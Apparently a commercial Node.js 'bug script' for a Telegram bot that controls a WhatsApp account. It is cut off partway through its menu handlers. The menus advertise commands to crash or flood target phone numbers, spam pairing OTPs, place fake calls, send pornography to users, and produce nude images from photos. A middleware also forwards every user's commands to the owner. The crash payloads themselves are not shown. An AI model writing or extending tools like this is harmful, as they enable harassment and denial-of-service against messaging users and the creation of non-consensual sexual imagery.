// -------------- pinn. Wopz --------------- \\
// -------------- Base By : @pinnxreal -------------- \\ 
// -------------- Created : 17 January 2026
// -------------- Please Dont Delete Credits ---------- \\

const { Telegraf, Markup, session } = require("telegraf"); 
const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateForwardMessageContent,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    generateMessageTag,
    generateRandomMessageId,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const chalk = require("chalk");
const axios = require("axios");
const { TOKEN_BOT } = require("./settings/config");
const crypto = require("crypto");
const premiumFile = "./database/premium.json";
const adminFile = "./database/admin.json";
const ownerFile = "./database/owner.json";
const sessionPath = './xevorzsession';
const Module = require('module');
const vm = require('vm');
const fetch = require('node-fetch');
const originalRequire = Module.prototype.require;
let bots = [];

const bot = new Telegraf(TOKEN_BOT);

// ~ thumbnailurl ~ \\
const thumbnailurl = "https://files.catbox.moe/3lqzoj.jpg";
const thumbnailUrl = fs.readFileSync('./assets/⚘. Xevorz - Catalyze 「 ཀ 」.jpg');

bot.use(session());

// ====== OWNER NOTIFY (LOG PEMAKAI FITUR) ======
// taruh di bawah: bot.use(session());

const OWNER_NOTIFY = true;

// anti spam: batas 1 notif per user per 8 detik (bisa kamu ubah)
const OWNER_NOTIFY_COOLDOWN_MS = 8000;
const _lastNotify = new Map();

function shouldNotify(userId, key = "global") {
  const k = `${userId}:${key}`;
  const now = Date.now();
  const last = _lastNotify.get(k) || 0;
  if (now - last < OWNER_NOTIFY_COOLDOWN_MS) return false;
  _lastNotify.set(k, now);
  return true;
}

function escapeHtml(s) {
  return String(s || "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

bot.use(async (ctx, next) => {
  try {
    if (!OWNER_NOTIFY) return next();
    if (!ctx.from) return next();

    const fromId = ctx.from.id;
    if (fromId === ownerID) return next(); // owner gak usah di-log

    const chatType = ctx.chat?.type || "unknown";
    const chatId = ctx.chat?.id;

    const username = ctx.from.username ? `@${ctx.from.username}` : "-";
    const fullname = `${ctx.from.first_name || ""} ${ctx.from.last_name || ""}`.trim() || "-";

    // Ambil “aksi” yang dipakai user:
    // 1) Command (/xxx)
    const text = ctx.message?.text || "";
    const isCommand = typeof text === "string" && text.startsWith("/");

    // 2) Tombol (callback_data)
    const cbData = ctx.callbackQuery?.data;

    // 3) Chat private (DM): kalau user ngetik biasa (bukan command) tetap ke-log (opsional)
    const isPrivate = chatType === "private";

    // Tentukan apakah perlu kirim notif:
    // - di group: kirim hanya kalau command / tombol (biar gak spam)
    // - di private: kirim untuk command / tombol / chat biasa
    const shouldSend =
      (isPrivate && (text || cbData)) ||
      (!isPrivate && (isCommand || cbData));

    if (!shouldSend) return next();

    // Anti spam per user per jenis aksi
    const key = cbData ? `cb:${cbData}` : isCommand ? `cmd:${text.split(/\s+/)[0]}` : "chat";
    if (!shouldNotify(fromId, key)) return next();

    const actionLabel = cbData
      ? `BUTTON: ${cbData}`
      : isCommand
      ? `COMMAND: ${text.split(/\s+/)[0]}`
      : `CHAT: ${text.slice(0, 80)}`;

    const detail =
      cbData
        ? ""
        : isCommand
        ? `\nArgs: ${escapeHtml(text.split(" ").slice(1).join(" ").slice(0, 200) || "-")}`
        : `\nText: ${escapeHtml(text.slice(0, 200) || "-")}`;

    const timeNow = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

    const msgToOwner =
`<b>📌 Ada yang pakai fitur bot</b>
<b>Waktu:</b> ${escapeHtml(timeNow)}
<b>User:</b> ${escapeHtml(fullname)} (${escapeHtml(username)})
<b>User ID:</b> <code>${fromId}</code>
<b>Chat:</b> ${escapeHtml(chatType)} | <code>${chatId}</code>
<b>Aksi:</b> ${escapeHtml(actionLabel)}${detail}`;

    // kirim ke owner (private owner chat)
    await ctx.telegram.sendMessage(ownerID, msgToOwner, { parse_mode: "HTML" });
  } catch (e) {
    // kalau gagal notify, jangan ganggu bot berjalan
  }

  return next();
});
// ====== END OWNER NOTIFY ======

let sock = null;
let isWhatsAppConnected = false;
let lastPairingMessage = null;
let linkedWhatsAppNumber = "";
const usePairingCode = true;

const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });

// ~ Runtime ~ \\
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Days, ${hours} Hours, ${minutes} Minutes, ${secs} Seconds`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

function formatTime(ms) {
  const totalSeconds = Math.ceil(ms / 1000);
  const minutes = Math.floor(totalSeconds / 60);
  const seconds = totalSeconds % 60;

  if (minutes > 0) {
    return `${minutes} menit ${seconds} detik`;
  }
  return `${seconds} detik`;
}

// ~ Coldown ~ \\
const cooldownFile = './assets/cooldown.json'
const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

// ~ Function Test Func ~ \\
function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

// ~ Formated Date ~ \\
function getCurrentDate() {
  const now = new Date();
  const options = {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  };
  return now.toLocaleDateString("id-ID", options);
}

// ~ Ensure Database ~ \\
function ensureDatabaseFolder() {
  const dbFolder = path.join(__dirname, "tokens.json");
  if (!fs.existsSync(dbFolder)) {
    fs.mkdirSync(dbFolder, { recursive: true });
  }
}

// ~ Raw Github ~ \\
const databaseUrl =
  "https://raw.githubusercontent.com/pinn-bit/pinn11/refs/heads/main/tokens.json";


async function fetchValidTokens() {
  try {
    const response = await axios.get(databaseUrl);
    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red.bold("Gagal Saat Mengambil Data Dari Url", error.message));
    return [];
  }
}

async function validateToken() {
 try {
  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(TOKEN_BOT)) {
    console.log(chalk.bold.red(`
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀⠀⠀
Ente Siapa Anj?\nMinta Akses Ke @pinnxreal`));
          process.exit(1);
    }
     startBot()
  } catch (error) {
   console.error("Error:", error);
      process.exit(1);
  }
}

function startBot() {
  console.log(
    chalk.cyan(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⢤⠠⡔⣰⢂⡲⣄⠢⢄⠠⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠌⠰⡇⢾⣬⣷⣽⣧⣿⣵⣾⠽⡎⡶⠡⠌⠄⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠲⣢⢹⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠡⢘⣥⣻⢬⢻⣿⣿⣿⣿⣿⣿⣤⢿⣱⢷⢔⡀⠂⠄⠀⠀⠀⠀⠀⠀⠀⡈⡌⣰⣸⠘⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠡⢂⡔⣧⣮⡾⣺⣗⣯⡿⠿⠿⠿⠾⣯⡽⣻⣭⡫⡻⣭⡘⠄⡀⠀⠀⠀⠀⠀⠁⠤⠍⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠌⡐⢡⢊⢮⣾⣻⣪⡮⠊⠁⠀⠀⠀⠀⠀⠀⠈⢓⡷⡙⣮⡪⡻⡰⣀⠔⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡈⢀⠐⢂⣏⢻⣏⠓⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢋⡟⣿⣾⣿⣇⡟⣉⣿⡖⢳⣾⣰⣶⣀⣀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠐⡠⢐⡼⣮⢯⣝⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣾⣽⣿⣿⣿⣿⣿⣾⣯⢿⣿⣷⡯⠛⠤⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣂⡡⢚⣯⣯⣿⣾⡧⠀⠆⠀⠀⠀⠀⠀⠀⢀⣀⣠⣠⣤⣾⣿⣿⣿⣿⣿⣿⣿⠿⡟⠟⠩⠁⠂⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣤⣧⣤⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⠟⢫⠙⠠⠁⠸⠄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠄⣠⣤⣿⣿⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣏⡉⡿⡈⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢤⡚⡽⢿⢿⡿⣿⢿⡿⠿⠿⠿⠻⠯⠿⣿⣿⣯⣻⣿⠽⠟⠟⠛⠻⢛⡩⣵⡟⡢⣟⠏⠠⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠁⠀⠂⠐⠀⠂⠀⠁⠈⠀⠁⠀⠂⠘⠫⣓⡷⡇⣿⣯⣴⣬⣿⡗⣟⣾⡿⡡⢊⠐⢀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠳⡝⣷⢾⢧⡷⣿⣿⠿⠉⡈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠠⠀⠃⡜⢚⠓⠃⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
Token Valids ( 𖣂 )
Author : @pinnxreal
Thanks For Purchasing This Script
`));
}

validateToken();

// ~ Function Connect Whatsapp ~ \\
const WhatsAppConnect = async () => { 
  const { state, saveCreds } = await useMultiFileAuthState("./session");
  const { version } = await fetchLatestBaileysVersion();
  const date = getCurrentDate();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }), // Log level diubah ke "info"
    auth: state,
    browser: ["Ubuntu", "Chrome", "20.0.00"],
    getMessage: async (key) => ({
      conversation: "P", // Placeholder, you can change this or remove it
    }),
  };

  sock = makeWASocket(connectionOptions);

  sock.ev.on("creds.update", saveCreds);
  

  sock.ev.on("connection.update", (update) => {
    const { connection, lastDisconnect } = update;

        if (connection === 'open') {
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote><b>⚘. 𝗔𝗥𝗖𝗛𝗘𝗥𝗬 - 𝗠𝗔𝗚𝗜𝗖「 ཀ 」</b></blockquote>  
⬡ ターゲット : ${lastPairingMessage.phoneNumber}  
⬡ コードペアリング : ${lastPairingMessage.pairingCode}  
⬡ デイデイト : ${date}`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        console.log(e)
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            console.log(chalk.bold.white(`
⬡ メーカー: @pinnxreal
⬡ バージョン : 5.0
⬡ ペアステータス: `) + chalk.green.bold('WhatsApp Terhubung'));
        }
      if (connection === 'close') {
      const shouldReconnect =
        lastDisconnect?.error?.output?.statusCode !==
        DisconnectReason.loggedOut;
        console.log(
        chalk.red('Koneksi WhatsApp terputus:'),
       shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                WhatsAppConnect();
      }
      isWhatsAppConnected = false;
    }
  });
};

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.replyWithHTML("<b>❌ Sender Not Connected\nPlease Using /connect</b>");
    return;
  }
  next();
};
const loadJSON = (file) => {
  if (!fs.existsSync(file)) return [];
  return JSON.parse(fs.readFileSync(file, "utf8"));
};

const saveJSON = (file, data) => {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
};



// ~ Delete Session ~ \\
function deleteSession() {
  if (fs.existsSync(sessionPath)) {
    const stat = fs.statSync(sessionPath);

    if (stat.isDirectory()) {
      fs.readdirSync(sessionPath).forEach(file => {
        fs.unlinkSync(path.join(sessionPath, file));
      });
      fs.rmdirSync(sessionPath);
      console.log('Folder session berhasil dihapus.');
    } else {
      fs.unlinkSync(sessionPath);
      console.log('File session berhasil dihapus.');
    }

    return true;
  } else {
    console.log('Session tidak ditemukan.');
    return false;
  }
}


let ownerUsers = loadJSON(ownerFile);
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

// ~ Check Admin & Owner ~ \\
const checkOwner = (ctx, next) => {
  if (!ownerUsers.includes(ctx.from.id.toString())) {
  return ctx.replyWithHTML("<blockquote>Owner Acces</blockquote>\n<b>Minta Akses Dulu Der Sama Owner Mu</b>");
       }
    next();
};

const checkOwnerOrAdmin = (ctx, next) => {
  if (!adminUsers.includes(ctx.from.id.toString()) && !ownerUsers.includes(ctx.from.id.toString())) {
  return ctx.replyWithHTML("<blockquote>Owner & Admin Acces</blockquote>\n<b>Minta Akses Dulu Der Sama Owner Mu</b>");
       }
    next();
};


// ~ Check Premium ~ \\
const checkPremium = (ctx, next) => {
  if (!premiumUsers.includes(ctx.from.id.toString())) {
    return ctx.replyWithHTML("<blockquote>Premium Acces</blockquote>\n<b>Kacunk Ga Premium Jir Wkwkwk</b>");
     }
    next();
};


// ~ Fungsi add Admin ~ \\
const addAdmin = (userId) => {
  if (!adminList.includes(userId)) {
    adminList.push(userId);
    saveAdmins();
  }
};


// ~ Fungsi Delete Admin ~ \\
const removeAdmin = (userId) => {
  adminList = adminList.filter((id) => id !== userId);
  saveAdmins();
};


// ~ Fungsi Simpan Admin ~ \\
const saveAdmins = () => {
  fs.writeFileSync("./database/admins.json", JSON.stringify(adminList));
};

// ===== HANDLER SAAT TEKAN TOMBOL "start" =====
// ===== MODERN MENU VANATIC PANEL =====
const bannerUrl = "https://files.catbox.moe/3lqzoj.jpg"; // banner kamu
const menuVideoUrl = "https://files.catbox.moe/usmrok.mp4"; // video menu (no fallback)


bot.start(async (ctx) => {
  try {
    const runtime = getBotRuntime();
    const username = ctx.from.first_name;
    const caption = `
    \`\`\`
╭────────────────────╼
│( 👑 )— Archery Magic
│◆ Developer : @pinnxreal
│◆ Version :  3.0 VVIP 
│◆ System Online: ${runtime}
│◆ User: ${username}
│◆ System: Database
╰────────────────────╼
🚫 Jangan Salah Menggunakan Script Bug Ini 🚫
╭────────────────────╼
│ ALL MENU BOT  Archery Magic 
│❒ HALAMAN 1 : BUGS MENU
│❒ HALAMAN 2 : TOOLS MENU
│❒ HALAMAN 3 : SETTINGS MENU
│❒ HALAMAN 4 : THANKS TO MENU
╰────────────────────╼
✨ Script Bug Telegram Yang Dirancang @pinnxreal ✨
\`\`\`
`;

    const buttons = [
      [
{ text: "➡️ Next", callback_data: "page2", style : "danger" }
],
        [
{ text: "👑 owner", url: "https://t.me/pinnxreal", style : "danger" }
],
      [
{ text: "📢 Chanel Owner", url: "https://t.me/allinformationpin", style : "success" }
],

    ];

    await ctx.replyWithVideo(menuVideoUrl, {
      caption,
      parse_mode: "MarkdownV2",
      reply_markup: { inline_keyboard: buttons },
    });
  } catch (err) {
    console.error("Error di /start:", err.message);
  }
});

// ======= HANDLE TOMBOL "BUKA MENU" DARI PASSWORD =======
bot.action("page1", async (ctx) => {
  try {
    await ctx.answerCbQuery("⬅️ Back to main menu");
    const runtime = getBotRuntime();
    const username = ctx.from.first_name;
    const bannerUrl = "https://files.catbox.moe/3lqzoj.jpg";

    const caption = `
    \`\`\`
╭────────────────────╼
│( 👑 )— Archery Magic
│◆ Developer : @pinnxreal
│◆ Version :  3.0 VVIP 
│◆ System Online: ${runtime}
│◆ User: ${username}
│◆ System: Database
╰────────────────────╼
🚫 Jangan Salah Menggunakan Script Bug Ini 🚫
╭────────────────────╼
│ ALL MENU BOT  Archery Magic 
│❒ HALAMAN 1 : BUGS MENU
│❒ HALAMAN 2 : TOOLS MENU
│❒ HALAMAN 3 : SETTINGS MENU
│❒ HALAMAN 4 : THANKS TO MENU
╰────────────────────╼
✨ Script Bug Telegram Yang Dirancang @pinnxreal ✨
\`\`\`
`;

    const buttons = [
      [
{ text: "➡️ Next", callback_data: "page2", style : "danger" }
],
      [
{ text: "👑 owner", url: "https://t.me/pinnxreal", style : "danger" }
],
      [
{ text: "📢 Chanel Owner", url: "https://t.me/allinformationpin", style : "success" }
],      

    ];

    await ctx.editMessageMedia(
      {
        type: "video",
        media: menuVideoUrl,
        caption,
        parse_mode: "MarkdownV2"
      },
      { reply_markup: { inline_keyboard: buttons } }
    );
  } catch (err) {
    console.error("Error di tombol page1:", err.message);
  }
});
// ===== PAGE 2 =====
// ===== MENU 1: TRACKSHOW =====
bot.action("page2", async (ctx) => {
  await ctx.answerCbQuery("➡️ Opening bugs Menu...");
  const runtime = getBotRuntime();
  const caption = `
\`\`\`
╭────────────────────╼
│( 👑 ) Archery Magic  3.0 VVIP 
│◆ Welcome To Menu Bugs! 
│◆ Enjoy The Script All Buyer! 
│◆ Gunakan Command Di Bawah! 
╰────────────────────╼
🚫 Jangan Salah Menggunakan Script Bug Ini 🚫
╭────────────────────╼
│🪲 Bebas Spam - Menu
├ /XspecterARC 628xx
│  ├ Delay invisible Bebas Spam 30%
├ /XdelayARC 628xx
│  ├ Delay invisible Bebas Spam 70%
├ /XspamARC 628xx
│  ├ Delay invisible Bebas Spam 30%
╰────────────────────╼
╭────────────────────╼
│👾 Execute - Menu
├ /XcomboARC 62xx
│  ├ Delay Combotion Invisible
├ /XcrashARC 62xx
│  ├ Delay Crash Combotion Invisible
├ /XcroserdARC 62xx
│  ├ Croserd Invisible
├ /XghostARC 62xx
│  ├ Delay Bebas Spam Anti Kenon
╰────────────────────╼
✨ Script Bug Telegram Yang Dirancang @pinnxreal ✨
\`\`\`
`;

    const buttons = [
      [
{ text: "⬅️ Back", callback_data: "page1", style : "danger" }, 
{ text: "➡️ Next", callback_data: "page3", style : "danger" }
],
        [
{ text: "👑 owner", url: "https://t.me/pinnxreal", style : "danger" }
],
      [
{ text: "📢 Chanel Owner", url: "https://t.me/allinformationpin", style : "success" }
],

    ];
       

    await ctx.editMessageMedia(
      {
        type: "photo",
        media: "https://files.catbox.moe/3lqzoj.jpg",
        caption,
        parse_mode: "MarkdownV2",
      },
      {
        reply_markup: { inline_keyboard: buttons },
      }
    )
}
   );
// ===== MENU 2: TOOLS =====
bot.action("page3", async (ctx) => {
  await ctx.answerCbQuery("➡️ Opening Tools Menu...");
  const caption = `
\`\`\`
╭────────────────────╼
│( 👑 )— Archery Magic  3.0 VVIP 
│◆ Developer : @pinnxreal
│◆ Welcome To Tools Menu! 
│◆ Enjoy The Script All Buyer
│◆ Gunakan Command Di Bawah! 
╰────────────────────╼
🚫 Jangan Salah Menggunakan Script Bug Ini 🚫
╭───⊱( 🦄 ) Tools° - Menu
│⬡ /csessions
│╰┈➤ Retrieving Sessions 
│⬡ /fakecall
│╰┈➤ Telepon Palsu
│⬡ /xpair
│╰┈➤ Spam Pair Otp
│⬡ /tofigure
│╰┈➤ Memper Hd Foto
│⬡ /cekbio
│╰┈➤ Mengecek Nomor Whatsapp Terdaftar/Ber Bio
│⬡ /sendbokep
│╰┈➤ Mengirim Bokep Ke User
│⬡ /iqc
│╰┈➤ Ss Whatsapp Iphone
│⬡ /addsender [ Creds.json ]
│╰┈➤ Add Sender Creds.json
│⬡ /brat [ Text ]
│╰┈➤ Create Sticker Brat
│⬡ /enchtml [ Reply File ]
│╰┈➤ Lock Code HTML
│⬡ /getcode [ Link ]
│╰┈➤ Get HTML Code
│⬡ /trackip [ Ip Adresss ]
│╰┈➤ Check Ip Information
│⬡ /tiktokdl [ Url ]
│╰┈➤ Downloader Video Tiktok
│⬡ /tourl [ Reply Media ]
│╰┈➤ Convert Media To Link
│⬡ /tonaked [ Reply Image ]
│╰┈➤ To Naked Girls
╰───────────────⊱
✨ Script Bug Telegram Yang Dirancang @pinnxreal ✨
\`\`\`
`;

    const buttons = [
      [
{ text: "⬅️ Back", callback_data: "page2", style : "success" }, 
{ text: "➡️ Next", callback_data: "page4", style : "success" }
],
        [
{ text: "👑 owner", url: "https://t.me/pinnxreal", style : "success" }
],
      [
{ text: "📢 Chanel Owner", url: "https://t.me/allinformationpin", style : "danger" }
],

    ];

    await ctx.editMessageMedia(
      {
        type: "photo",
        media: "https://files.catbox.moe/3lqzoj.jpg",
        caption,
        parse_mode: "MarkdownV2",
      },
      {
        reply_markup: { inline_keyboard: buttons },
      }
    )
});


// ===== MENU 3: SETTINGS =====
bot.action("page4", async (ctx) => {
  await ctx.answerCbQuery("➡️ Opening Settings Menu...");
  const caption = `
\`\`\`
╭────────────────────╼
│( 👑 )— Archery Magic  3.0 VVIP 
│◆ Developer : @pinnxreal
│◆ Welcome To Settings Menu! 
│◆ Enjoy The Script All Buyer! 
│◆ Gunakan Command Di Bawah! 
╰────────────────────╼
🚫 Jangan Salah Menggunakan Script Bug Ini 🚫
╭───⊱( 🍁 ) Controls° - Menu
│⬡ /delsessions 
│╰┈➤ Delete Sessions
│⬡ /linkgb req
│╰┈➤ Mengambil Link Grub
│⬡ /connect 62xx
│╰┈➤ Add Sender Whatsapp
│⬡ /addadmin ID
│╰┈➤ Add Admin Users
│⬡ /deladmin ID
│╰┈➤ Delete Admin Users
│⬡ /addprem ID
│╰┈➤ Add Premium Users
│⬡ /delprem ID
│╰┈➤ Delete Premium Users
╰───────────────⊱
✨ Script Bug Telegram Yang Dirancang @pinnxreal ✨
\`\`\`
`;

  
    const buttons = [
      [
{ text: "⬅️ Back", callback_data: "page3", style : "success" }, 
{ text: "➡️ Next", callback_data: "page5", style : "success" }
],
        [
{ text: "👑 owner", url: "https://t.me/pinnxreal", style : "success" }
],
      [
{ text: "📢 Chanel Owner", url: "https://t.me/allinformationpin", style : "danger" }
],

    ];

    await ctx.editMessageMedia(
      {
        type: "photo",
        media: "https://files.catbox.moe/3lqzoj.jpg",
        caption,
        parse_mode: "MarkdownV2",
      },
      {
        reply_markup: { inline_keyboard: buttons },
      }
    )
});

bot.action("page5", async (ctx) => {
  await ctx.answerCbQuery("➡️ Opening tqto Menu...");
  const caption = `
\`\`\`
╭────────────────────╼
│( 👑 )— Archery Magic  3.0 VVIP 
│◆ Developer : @pinnxreal
│◆ Welcome To Thanks Menu! 
│◆ Enjoy The Script All Buyer! 
│◆ All Support! 
╰────────────────────╼
🚫 Jangan Salah Menggunakan Script Bug Ini 🚫
╭───⊱( 🍁 ) thanks to° - Menu
│⬡ Xwarr
│╰┈➤ Guru
│⬡ Wolf
│╰┈➤ Guru
│⬡ Xata
│╰┈➤ Sepuh
│⬡ All Buyer  Archery Magic
│⬡ All Partner pinn
╰───────────────⊱
✨ Script Bug Telegram Yang Dirancang @pinnxreal ✨
\`\`\`
`;

  
    const buttons = [
      [
{ text: "🏠 Home", callback_data: "page1", style : "danger" }
],
        [
{ text: "👑 owner", url: "https://t.me/pinnxreal", style : "danger" }
],
      [
{ text: "📢 Chanel Owner", url: "https://t.me/allinformationpin", style : "success" }
],

    ];

    await ctx.editMessageMedia(
      {
        type: "photo",
        media: "https://files.catbox.moe/3lqzoj.jpg",
        caption,
